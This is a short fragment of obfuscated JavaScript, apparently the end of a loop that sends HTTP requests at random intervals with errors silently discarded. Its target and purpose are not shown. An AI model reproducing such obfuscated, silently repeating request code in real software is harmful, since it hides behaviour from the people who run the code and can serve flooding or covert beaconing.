        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2fe2 + 0x15b * -0x4 + -0xf1e) * getRandomInt(-0x48d * -0x5 + -0x943 * 0x1 + -0xd7d, -0x1b17 * -0x1 + -0x1 * 0x1779 + 0x133 * -0x3));
}, 0x169a + 0xb17 + -0x214d);